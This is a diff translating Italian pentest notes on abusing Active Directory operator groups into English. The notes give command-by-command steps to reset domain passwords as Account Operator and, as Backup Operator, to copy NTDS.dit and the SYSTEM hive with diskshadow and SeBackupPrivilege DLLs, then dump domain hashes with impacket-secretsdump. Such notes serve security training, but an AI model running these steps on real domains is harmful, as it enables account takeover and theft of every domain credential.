@@ -2,19 +2,20 @@
 
 ### **ACCOUNT OPERATORS**
 
-Può gestire e creare utenti amministratore non amministratore, quindi anche cambiare le password di altri utenti
+It can manage and create both administrator and non-administrator users, thus also changing the passwords of other users.
 
 ```powershell
 net user <USER> NewPassword1234 /domain
 ```
 
-#### **BACKUP OPERATORS**
+### **BACKUP OPERATORS**
 
-_DUMP NTDS.DIT_ Dobbiamo riuscire a fare il backup del file ntds.dit, un file contenente tutti gli hash e informazioni del dominio Scarica i seguenti file https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+to dump ntds.dit we need to be able to back up the ntds.dit file, a file containing all the hashes and information of the domain. Download the following files:
 
-***
+* [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll)
+* [SeBackupPrivilegeCmdLets.dll ](https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll)
 
-https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll Crea un file chiamato diskshadow.txt contenente queste righe
+Create a file named diskshadow.txt containing these lines.
 
 ```vim
 set context persistent nowriters #
@@ -27,13 +28,13 @@ delete shadows volume %myAlias% #
 reset #
 ```
 
-crea una cartella tmp sulla macchina
+Create a folder named 'tmp' on the machine.
 
 ```powershell
 mkdir c:\tmp
 ```
 
-e carica tutti e tre i file
+And upload all three files
 
 ```powershell
 upload SeBackupPrivilegeCmdLets.dll
@@ -41,32 +42,33 @@ upload SeBackupPrivilegeUtils.dll
 upload diskshadow.txt
 ```
 
-avvia diskshadow
+Start DiskShadow
 
 ```powershell
 diskshadow.exe /s c:\tmp\diskshadow.txt
 ```
 
-!\[\[Pasted image 20230510125209.png]] Importa i moduli caricati prima e usa il comando
+<figure><img src="../../../.gitbook/assets/Pasted image 20230510125209.png" alt=""><figcaption></figcaption></figure>
+
+Import the previously loaded modules and use the command.
 
 ```powershell
-Import-Module
 Set-SeBackupPrivilege
 ```
 
-Copia il file SYSTEM e NTDS.dit e scaricateli
+Copy the SYSTEM and NTDS.dit files and download them.
 
 ```powershell
 reg save HKLM\SYSTEM c:\tmp\system
 copy-filesebackupprivilege x:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
 ```
 
-Usa secretdump di IMPACKET per dumpare gli hash ed entra con evil-winrm
+Use IMPACKET's secretdump to dump the hashes and log in with evil-winrm.
 
 ```bash
 impacket-secretsdump -ntds ntds.dit -system system local
 ```
 
-#### **SERVER OPERATOR**
+### **SERVER OPERATOR**
 
-Puoi restartare i servizi e modificarne i PATH
+Can you restart the services and modify their PATH?
